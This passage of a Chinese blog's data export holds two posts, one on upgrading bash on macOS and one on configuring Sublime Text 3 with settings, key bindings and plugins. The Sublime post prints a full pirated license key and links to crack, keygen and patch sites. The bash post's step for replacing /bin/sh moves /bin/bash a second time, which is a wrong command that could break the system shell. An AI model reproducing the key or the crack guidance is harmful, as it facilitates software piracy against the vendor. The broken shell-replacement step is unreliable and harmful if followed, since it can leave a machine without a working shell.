https://homebrew.bintray.com/bottles/readline-6.3.8.yosemite.bottle.tar.gz\n……\n```\n\n### 方式2：自行编译安装\nbash下载地址：http://ftp.gnu.org/gnu/bash/\n\n```\nwget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz\ntar zxvf bash-4.2.tar.gz\ncd bash-4.2\n./configure\nmake\nmake install\n```\n\n\n## 三、版本替换\n\n### 1. 替换bash\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/bash.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/bash\n```\n\n由于本mac版本下的sh并不是直接链接bash，而是bash的一个文件拷贝。因此，还要替换默认的sh指向的命令为bash，如下：\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/sh.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/sh\n```\n\n### 2. 验证\n通过bash和sh命令查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ bash -version\nGNU bash，版本 4.3.42(1)-release (x86_64-apple-darwin14.5.0)\nCopyright (C) 2013 Free Software Foundation, Inc.\n许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n```\n\n通过BASH_VERSION变更查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ echo $BASH_VERSION\n4.3.42(1)-release\n```\n\n\n## 四、重要特性\n关联数组从bash 4.0开始被引入，关联数组的索引值可以使用任意的文本。\n\n\n## 五、参考文档\n1. [升级Mountain Lion的bash到4.2版本](http://zengrong.net/post/1830.htm)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)\n3. [shell升级，Linux系统升级bash](http://www.1987.name/166.html)\n4. [MAC系统默认命令行环境BASH版本升级修改](http://levi.yii.so/archives/4862)","slug":"article/mac/升级mac bash到4.3版本","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxtf00505nbtz95tmmoq","content":"<p><img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\"></p>\n<h1 id=\"升级mac-bash到4-3版本\"><a href=\"#升级mac-bash到4-3版本\" class=\"headerlink\" title=\"升级mac bash到4.3版本\"></a>升级mac bash到4.3版本</h1><h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>MAC OS版本：OS X Yosemite 10.10.5</p>\n<p>经查看bash版本发现，默认的bash版本为：3.2.57(1)-release<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ /bin/bash -version</div><div class=\"line\">GNU bash, version 3.2.57(1)-release (x86_64-apple-darwin14)</div><div class=\"line\">Copyright (C) 2007 Free Software Foundation, Inc.</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、版本升级\"><a href=\"#二、版本升级\" class=\"headerlink\" title=\"二、版本升级\"></a>二、版本升级</h2><p>借助mac下的命令行安装工具brew安装bash。</p>\n<h3 id=\"方式1：brew安装\"><a href=\"#方式1：brew安装\" class=\"headerlink\" title=\"方式1：brew安装\"></a>方式1：brew安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:article yeshaoting$ brew install bash</div><div class=\"line\">==&gt; Installing dependencies <span class=\"keyword\">for</span> bash: readline</div><div class=\"line\">==&gt; Installing bash dependency: readline</div><div class=\"line\">==&gt; Downloading https://homebrew.bintray.com/bottles/readline-6.3.8.yosemite.bottle.tar.gz</div><div class=\"line\">……</div></pre></td></tr></table></figure>\n<h3 id=\"方式2：自行编译安装\"><a href=\"#方式2：自行编译安装\" class=\"headerlink\" title=\"方式2：自行编译安装\"></a>方式2：自行编译安装</h3><p>bash下载地址：<a href=\"http://ftp.gnu.org/gnu/bash/\" target=\"_blank\" rel=\"external\">http://ftp.gnu.org/gnu/bash/</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz</div><div class=\"line\">tar zxvf bash-4.2.tar.gz</div><div class=\"line\">cd bash-4.2</div><div class=\"line\">./configure</div><div class=\"line\">make</div><div class=\"line\">make install</div></pre></td></tr></table></figure>\n<h2 id=\"三、版本替换\"><a href=\"#三、版本替换\" class=\"headerlink\" title=\"三、版本替换\"></a>三、版本替换</h2><h3 id=\"1-替换bash\"><a href=\"#1-替换bash\" class=\"headerlink\" title=\"1. 替换bash\"></a>1. 替换bash</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/bash.origin</div><div class=\"line\">yerba-buena:~ yeshaoting$ sudo ln <span class=\"_\">-s</span> /usr/<span class=\"built_in\">local</span>/opt/bash/bin/bash /bin/bash</div></pre></td></tr></table></figure>\n<p>由于本mac版本下的sh并不是直接链接bash，而是bash的一个文件拷贝。因此，还要替换默认的sh指向的命令为bash，如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/sh.origin</div><div class=\"line\">yerba-buena:~ yeshaoting$ sudo ln <span class=\"_\">-s</span> /usr/<span class=\"built_in\">local</span>/opt/bash/bin/bash /bin/sh</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-验证\"><a href=\"#2-验证\" class=\"headerlink\" title=\"2. 验证\"></a>2. 验证</h3><p>通过bash和sh命令查看版本：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ bash -version</div><div class=\"line\">GNU bash，版本 4.3.42(1)-release (x86_64-apple-darwin14.5.0)</div><div class=\"line\">Copyright (C) 2013 Free Software Foundation, Inc.</div><div class=\"line\">许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class=\"line\"></div><div class=\"line\">This is free software; you are free to change and redistribute it.</div><div class=\"line\">There is NO WARRANTY, to the extent permitted by law.</div></pre></td></tr></table></figure></p>\n<p>通过BASH_VERSION变更查看版本：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$BASH_VERSION</span></div><div class=\"line\">4.3.42(1)-release</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、重要特性\"><a href=\"#四、重要特性\" class=\"headerlink\" title=\"四、重要特性\"></a>四、重要特性</h2><p>关联数组从bash 4.0开始被引入，关联数组的索引值可以使用任意的文本。</p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://zengrong.net/post/1830.htm\" target=\"_blank\" rel=\"external\">升级Mountain Lion的bash到4.2版本</a></li>\n<li><a href=\"http://www.1987.name/164.html\" target=\"_blank\" rel=\"external\">[Shell学习笔记] 数组、关联数组和别名使用</a></li>\n<li><a href=\"http://www.1987.name/166.html\" target=\"_blank\" rel=\"external\">shell升级，Linux系统升级bash</a></li>\n<li><a href=\"http://levi.yii.so/archives/4862\" target=\"_blank\" rel=\"external\">MAC系统默认命令行环境BASH版本升级修改</a></li>\n</ol>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" /></p>\n<h1 id=\"升级mac-bash到4-3版本\"><a href=\"#升级mac-bash到4-3版本\" class=\"headerlink\" title=\"升级mac bash到4.3版本\"></a>升级mac bash到4.3版本</h1><h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>MAC OS版本：OS X Yosemite 10.10.5</p>\n<p>经查看bash版本发现，默认的bash版本为：3.2.57(1)-release<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ /bin/bash -version</div><div class=\"line\">GNU bash, version 3.2.57(1)-release (x86_64-apple-darwin14)</div><div class=\"line\">Copyright (C) 2007 Free Software Foundation, Inc.</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、版本升级\"><a href=\"#二、版本升级\" class=\"headerlink\" title=\"二、版本升级\"></a>二、版本升级</h2><p>借助mac下的命令行安装工具brew安装bash。</p>\n<h3 id=\"方式1：brew安装\"><a href=\"#方式1：brew安装\" class=\"headerlink\" title=\"方式1：brew安装\"></a>方式1：brew安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:article yeshaoting$ brew install bash</div><div class=\"line\">==&gt; Installing dependencies <span class=\"keyword\">for</span> bash: readline</div><div class=\"line\">==&gt; Installing bash dependency: readline</div><div class=\"line\">==&gt; Downloading https://homebrew.bintray.com/bottles/readline-6.3.8.yosemite.bottle.tar.gz</div><div class=\"line\">……</div></pre></td></tr></table></figure>\n<h3 id=\"方式2：自行编译安装\"><a href=\"#方式2：自行编译安装\" class=\"headerlink\" title=\"方式2：自行编译安装\"></a>方式2：自行编译安装</h3><p>bash下载地址：<a href=\"http://ftp.gnu.org/gnu/bash/\">http://ftp.gnu.org/gnu/bash/</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz</div><div class=\"line\">tar zxvf bash-4.2.tar.gz</div><div class=\"line\">cd bash-4.2</div><div class=\"line\">./configure</div><div class=\"line\">make</div><div class=\"line\">make install</div></pre></td></tr></table></figure>\n<h2 id=\"三、版本替换\"><a href=\"#三、版本替换\" class=\"headerlink\" title=\"三、版本替换\"></a>三、版本替换</h2><h3 id=\"1-替换bash\"><a href=\"#1-替换bash\" class=\"headerlink\" title=\"1. 替换bash\"></a>1. 替换bash</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/bash.origin</div><div class=\"line\">yerba-buena:~ yeshaoting$ sudo ln <span class=\"_\">-s</span> /usr/<span class=\"built_in\">local</span>/opt/bash/bin/bash /bin/bash</div></pre></td></tr></table></figure>\n<p>由于本mac版本下的sh并不是直接链接bash，而是bash的一个文件拷贝。因此，还要替换默认的sh指向的命令为bash，如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/sh.origin</div><div class=\"line\">yerba-buena:~ yeshaoting$ sudo ln <span class=\"_\">-s</span> /usr/<span class=\"built_in\">local</span>/opt/bash/bin/bash /bin/sh</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-验证\"><a href=\"#2-验证\" class=\"headerlink\" title=\"2. 验证\"></a>2. 验证</h3><p>通过bash和sh命令查看版本：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ bash -version</div><div class=\"line\">GNU bash，版本 4.3.42(1)-release (x86_64-apple-darwin14.5.0)</div><div class=\"line\">Copyright (C) 2013 Free Software Foundation, Inc.</div><div class=\"line\">许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class=\"line\"></div><div class=\"line\">This is free software; you are free to change and redistribute it.</div><div class=\"line\">There is NO WARRANTY, to the extent permitted by law.</div></pre></td></tr></table></figure></p>\n<p>通过BASH_VERSION变更查看版本：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ <span class=\"built_in\">echo</span> <span class=\"variable\">$BASH_VERSION</span></div><div class=\"line\">4.3.42(1)-release</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、重要特性\"><a href=\"#四、重要特性\" class=\"headerlink\" title=\"四、重要特性\"></a>四、重要特性</h2><p>关联数组从bash 4.0开始被引入，关联数组的索引值可以使用任意的文本。</p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://zengrong.net/post/1830.htm\">升级Mountain Lion的bash到4.2版本</a></li>\n<li><a href=\"http://www.1987.name/164.html\">[Shell学习笔记] 数组、关联数组和别名使用</a></li>\n<li><a href=\"http://www.1987.name/166.html\">shell升级，Linux系统升级bash</a></li>\n<li><a href=\"http://levi.yii.so/archives/4862\">MAC系统默认命令行环境BASH版本升级修改</a></li>\n</ol>\n"},{"title":"打造个人专属Sublime Text 3","date":"2016-01-25T06:28:00.000Z","_content":"\n<img src=\"/asserts/images/logo/sublime.png\" class=\"img-logo img-center\" />\n\n## 一、前言\n\n### 1. 下载与破解\n当前可用的破解码如下：\n``` txt\n—– BEGIN LICENSE —–\nAndrew Weber\nSingle User License\nEA7E-855605\n813A03DD 5E4AD9E6 6C0EEB94 BC99798F\n942194A6 02396E98 E62C9979 4BB979FE\n91424C9D A45400BF F6747D88 2FB88078\n90F5CC94 1CDC92DC 8457107A F151657B\n1D22E383 A997F016 42397640 33F41CFC\nE1D0AE85 A0BBD039 0E9C8D55 E1B89D5D\n5CDB7036 E56DE1C0 EFCC0840 650CD3A6\nB98FC99C 8FAC73EE D2B95564 DF450523\n—— END LICENSE ——\n```\n\n参见：\n - [Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程](http://www.xiumu.org/note/sublime-text-3.shtml)\n - [Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器](http://www.waitsun.com/sublime-text-3-for-mac.html)\n - [Sublime Text 3破解补丁](https://www.shuax.com/archives/SublimeText3Crack.html)\n\n\n### 2. Sublime Text 2与Sublime Text 3区别\n简单的说：\n - ST3支持在项目目录里面寻找变量提供了\n - 对标签页更好地支持（更多的命令和快捷键）\n - 加快了程序运行的速度\n - 更新了API，使用Python3.3\n\n参见：\n - [Sublime Text3与Sublime Text 2的区别在哪里？](https://www.zhihu.com/question/25078353)\n - [Sublime Text 3 文档之迁移指南](http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html)\n\n\n## 二、配置\n\n### 1. 我的配置\n``` json\n{\n\t\"ignored_packages\":\n\t[\n\t\t\"Vintage\"\n\t],\n\n\t// 字体\n\t\"font_size\": 12,\n\n\t// 高亮当前行\n\t\"highlight_line\": true,\n\n\t// 新标签页打开文件\n\t\"preview_on_click\": false,\n\n\t//滚动能否超过结尾\n\t\"scroll_past_end\": false,\n\n\t// TAB缩进宽度\n\t\"tab_size\": 4,\n\n\t// 自动转换TAB为空格\n\t\"translate_tabs_to_spaces\": false,\n\n\t// 皮肤\n\t\"theme\": \"Soda Dark 3.sublime-theme\",\n\n\t// 关闭自动更新\n\t\"update_check\": false,\n\n\t// 自动换行\n\t\"word_wrap\": \"true\"\n}\n```\n\n### 2. 关闭自动更新\nSublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：\n``` json\n\"update_check\": false\n```\n\n### 3. soda主题\n参见：https://github.com/buymeasoda/soda-theme/\n\n通过package controller安装Theme - Soda。\n\n### 4. 记住打开的文件\n``` json\n\"remember_open_files\": false\n```\n\n<!-- more -->\n\n### 5. Sublime Text 2 使用 Eclipse 快捷键\n[Sublime Text User Preferences -- Eclipse shortcuts for Sublime Text](https://gist.github.com/ufologist/5590481#file-package-control-sublime-settings)\n[打造属于自己的前端开发神器 -- 给Sublime Text加上Eclipse的光环](http://www.douban.com/note/276794943/)\n\n``` json\n[\n    /**\n     * 常用快捷键(Sublime默认)\n     * --------------\n     * \n     * 光标一个单词一个单词的移动\n     * { \"keys\": [\"super+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false} },\n     * 按住shift来选文字时, 一个个单词的选而不是一个个字母\n     * { \"keys\": [\"super+shift+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false, \"extend\": true} },\n     *\n     * 类似光标一个个单词的移动\n     * { \"keys\": [\"alt+left\"], \"command\": \"move\", \"args\": {\"by\": \"subwords\", \"forward\": false} },\n     * { \"keys\": [\"alt+shift+right\"], \"command\": \"move\", \"args\": {\"by\": \"subword_ends\", \"forward\": true, \"extend\": true} },\n     *\n     * 缩进\n     * { \"keys\": [\"super+]\"], \"command\": \"indent\" },\n     * { \"keys\": [\"super+[\"], \"command\": \"unindent\" },\n     *\n     * 删除整个单词\n     * { \"keys\": [\"super+backspace\"], \"command\": \"delete_word\", \"args\": { \"forward\": false } },\n     * { \"keys\": [\"super+delete\"], \"command\": \"delete_word\", \"args\": { \"forward\": true } },\n     *\n     * 行排序(例如选中几个JSON字段, 让这些字段名按字母顺序排序)\n     * { \"keys\": [\"f9\"], \"command\": \"sort_lines\", \"args\": {\"case_sensitive\": false} },\n     *\n     * 参考\n     * ----------------------\n     * Using Sublime Text as your IDE\n     * http://www.chromium.org/developers/sublime-text\n     *\n     * Web Development With Sublime Text 2\n     * http://www.paulund.co.uk/web-development-with-sublime-text-2\n     */\n\n    // editor配置\n    { \"keys\": [\"super+v\"], \"command\": \"paste_and_indent\" },\n    { \"keys\": [\"super+shift+v\"], \"command\": \"paste\" },\n\n    /**\n     * 适配eclipse快捷键\n     *\n     * 下面这位仁兄早就有了这个想法\n     * Eclipse shortcuts for Sublime Text 2\n     * http://icoloma.blogspot.com/2011/10/eclipse-shortcuts-for-sublime-text-2.html\n     */\n    { \"keys\": [\"alt+/\"], \"command\": \"auto_complete\" },\n    { \"keys\": [\"super+i\"], \"command\": \"reindent\" },\n    // 当前行和下面一行交互位置\n    { \"keys\": [\"alt+up\"], \"command\": \"swap_line_up\" },\n    { \"keys\": [\"alt+down\"], \"command\": \"swap_line_down\" },\n    // 复制当前行到上一行\n    { \"keys\": [\"super+alt+up\"], \"command\": \"duplicate_line\" },\n    // 复制当前行到下一行\n    { \"keys\": [\"super+alt+down\"], \"command\": \"duplicate_line\" },\n    // 删除整行\n    { \"keys\": [\"super+d\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Delete Line.sublime-macro\"} },\n    // 光标移动到指定行\n    { \"keys\": [\"super+l\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \":\"} },\n    // 快速定位到选中的文字\n    { \"keys\": [\"super+k\"], \"command\": \"find_under_expand_skip\" },\n    // { \"keys\": [\"super+shift+x\"], \"command\": \"swap_case\" },\n    { \"keys\": [\"super+shift+x\"], \"command\": \"upper_case\" },\n    { \"keys\": [\"super+shift+y\"], \"command\": \"lower_case\" },\n    // 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后)\n    { \"keys\": [\"shift+enter\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Add Line.sublime-macro\"} },\n    // 定位到对于的匹配符(譬如{})(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之)\n    { \"keys\": [\"super+shift+p\"], \"command\": \"move_to\", \"args\": {\"to\": \"brackets\"} },\n    // 这个命令默认使用的是super+shift+p\n    { \"keys\": [\"super+p\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"command_palette\"} },\n    // outline\n    { \"keys\": [\"super+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"@\"} },\n    // 当前文件中的关键字(方便快速查找内容)\n    { \"keys\": [\"super+alt+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"#\"} },\n    // open resource\n    { \"keys\": [\"super+shift+r\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"show_files\": true} },\n    // 文件内查找/替换\n    { \"keys\": [\"super+f\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"replace\"} },\n    // 全局查找/替换, 在查询结果中双击跳转到匹配位置\n    {\"keys\": [\"super+h\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"find_in_files\"} },\n\n    // plugin配置\n    { \"keys\": [\"alt+a\"], \"command\": \"alignment\" },\n    {\"keys\": [\"super+shift+f\"], \"command\": \"js_format\"}\n]\n```\n\n## 三、插件\n\n### 1. Package Control\n最简单的方式是通过 ctrl+\\`快捷键打开控制台，粘贴以下代码到控制台执行。\n参见：[Package Control INSTALLATION](https://packagecontrol.io/installation#st3)\n\n#### Sublime Text 3\n``` python\nimport urllib.request,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by)\n```\n\n#### Sublime Text 2\n``` python\nimport urllib2,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), 'wb' ).write(by) if dh == h else None; print('Error validating download (got %s instead of %s), please try manual install' % (dh, h) if dh != h else 'Please restart Sublime Text to finish installation')\n```\n\n### 2. 实用插件\n- SideBarEnhancements左侧菜单栏增强\n- ConvertToUTF8\n- AutoFileName自动补全文件(目录)名\n- BracketHighlighter突出显示括号/引号\n- ColorHighlighter 背景显示16进制颜色\n- DocBlockr 生成注释模板\n- Sublime CodeIntel – 智能代码提示\n- FreeMarker:Freemarker模板语言辅助\n- SublimeCodeIntel 代码提示\n- JSHint、JsFormart、jQuery\n- Color Highlighter\n- Indent XML\n- sublimeLinter\n- pretty json\n\n\n参见：\n - [sublime Text3配置及快捷键、插件推荐总结](http://blog.csdn.net/xby1993/article/details/23995667)\n - [SublimeText2 快捷键一览表](http://blog.useasp.net/archive/2013/06/14/sublime-text-2-all-default-Shortcuts-table-on-windows-translated-with-chinese.aspx)\n\n","source":"_posts/article/mac/打造个人专属Sublime Text 3.md","raw":"title: 打造个人专属Sublime Text 3\ntags:\n  - sublime\n  - mac\ncategories:\n  - 工具软件\ndate: 2016-01-25 14:28:00\n---\n\n<img src=\"/asserts/images/logo/sublime.png\" class=\"img-logo img-center\" />\n\n## 一、前言\n\n### 1. 下载与破解\n当前可用的破解码如下：\n``` txt\n—– BEGIN LICENSE —–\nAndrew Weber\nSingle User License\nEA7E-855605\n813A03DD 5E4AD9E6 6C0EEB94 BC99798F\n942194A6 02396E98 E62C9979 4BB979FE\n91424C9D A45400BF F6747D88 2FB88078\n90F5CC94 1CDC92DC 8457107A F151657B\n1D22E383 A997F016 42397640 33F41CFC\nE1D0AE85 A0BBD039 0E9C8D55 E1B89D5D\n5CDB7036 E56DE1C0 EFCC0840 650CD3A6\nB98FC99C 8FAC73EE D2B95564 DF450523\n—— END LICENSE ——\n```\n\n参见：\n - [Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程](http://www.xiumu.org/note/sublime-text-3.shtml)\n - [Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器](http://www.waitsun.com/sublime-text-3-for-mac.html)\n - [Sublime Text 3破解补丁](https://www.shuax.com/archives/SublimeText3Crack.html)\n\n\n### 2. Sublime Text 2与Sublime Text 3区别\n简单的说：\n - ST3支持在项目目录里面寻找变量提供了\n - 对标签页更好地支持（更多的命令和快捷键）\n - 加快了程序运行的速度\n - 更新了API，使用Python3.3\n\n参见：\n - [Sublime Text3与Sublime Text 2的区别在哪里？](https://www.zhihu.com/question/25078353)\n - [Sublime Text 3 文档之迁移指南](http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html)\n\n\n## 二、配置\n\n### 1. 我的配置\n``` json\n{\n\t\"ignored_packages\":\n\t[\n\t\t\"Vintage\"\n\t],\n\n\t// 字体\n\t\"font_size\": 12,\n\n\t// 高亮当前行\n\t\"highlight_line\": true,\n\n\t// 新标签页打开文件\n\t\"preview_on_click\": false,\n\n\t//滚动能否超过结尾\n\t\"scroll_past_end\": false,\n\n\t// TAB缩进宽度\n\t\"tab_size\": 4,\n\n\t// 自动转换TAB为空格\n\t\"translate_tabs_to_spaces\": false,\n\n\t// 皮肤\n\t\"theme\": \"Soda Dark 3.sublime-theme\",\n\n\t// 关闭自动更新\n\t\"update_check\": false,\n\n\t// 自动换行\n\t\"word_wrap\": \"true\"\n}\n```\n\n### 2. 关闭自动更新\nSublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：\n``` json\n\"update_check\": false\n```\n\n### 3. soda主题\n参见：https://github.com/buymeasoda/soda-theme/\n\n通过package controller安装Theme - Soda。\n\n### 4. 记住打开的文件\n``` json\n\"remember_open_files\": false\n```\n\n<!-- more -->\n\n### 5. Sublime Text 2 使用 Eclipse 快捷键\n[Sublime Text User Preferences -- Eclipse shortcuts for Sublime Text](https://gist.github.com/ufologist/5590481#file-package-control-sublime-settings)\n[打造属于自己的前端开发神器 -- 给Sublime Text加上Eclipse的光环](http://www.douban.com/note/276794943/)\n\n``` json\n[\n    /**\n     * 常用快捷键(Sublime默认)\n     * --------------\n     * \n     * 光标一个单词一个单词的移动\n     * { \"keys\": [\"super+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false} },\n     * 按住shift来选文字时, 一个个单词的选而不是一个个字母\n     * { \"keys\": [\"super+shift+left\"], \"command\": \"move\", \"args\": {\"by\": \"words\", \"forward\": false, \"extend\": true} },\n     *\n     * 类似光标一个个单词的移动\n     * { \"keys\": [\"alt+left\"], \"command\": \"move\", \"args\": {\"by\": \"subwords\", \"forward\": false} },\n     * { \"keys\": [\"alt+shift+right\"], \"command\": \"move\", \"args\": {\"by\": \"subword_ends\", \"forward\": true, \"extend\": true} },\n     *\n     * 缩进\n     * { \"keys\": [\"super+]\"], \"command\": \"indent\" },\n     * { \"keys\": [\"super+[\"], \"command\": \"unindent\" },\n     *\n     * 删除整个单词\n     * { \"keys\": [\"super+backspace\"], \"command\": \"delete_word\", \"args\": { \"forward\": false } },\n     * { \"keys\": [\"super+delete\"], \"command\": \"delete_word\", \"args\": { \"forward\": true } },\n     *\n     * 行排序(例如选中几个JSON字段, 让这些字段名按字母顺序排序)\n     * { \"keys\": [\"f9\"], \"command\": \"sort_lines\", \"args\": {\"case_sensitive\": false} },\n     *\n     * 参考\n     * ----------------------\n     * Using Sublime Text as your IDE\n     * http://www.chromium.org/developers/sublime-text\n     *\n     * Web Development With Sublime Text 2\n     * http://www.paulund.co.uk/web-development-with-sublime-text-2\n     */\n\n    // editor配置\n    { \"keys\": [\"super+v\"], \"command\": \"paste_and_indent\" },\n    { \"keys\": [\"super+shift+v\"], \"command\": \"paste\" },\n\n    /**\n     * 适配eclipse快捷键\n     *\n     * 下面这位仁兄早就有了这个想法\n     * Eclipse shortcuts for Sublime Text 2\n     * http://icoloma.blogspot.com/2011/10/eclipse-shortcuts-for-sublime-text-2.html\n     */\n    { \"keys\": [\"alt+/\"], \"command\": \"auto_complete\" },\n    { \"keys\": [\"super+i\"], \"command\": \"reindent\" },\n    // 当前行和下面一行交互位置\n    { \"keys\": [\"alt+up\"], \"command\": \"swap_line_up\" },\n    { \"keys\": [\"alt+down\"], \"command\": \"swap_line_down\" },\n    // 复制当前行到上一行\n    { \"keys\": [\"super+alt+up\"], \"command\": \"duplicate_line\" },\n    // 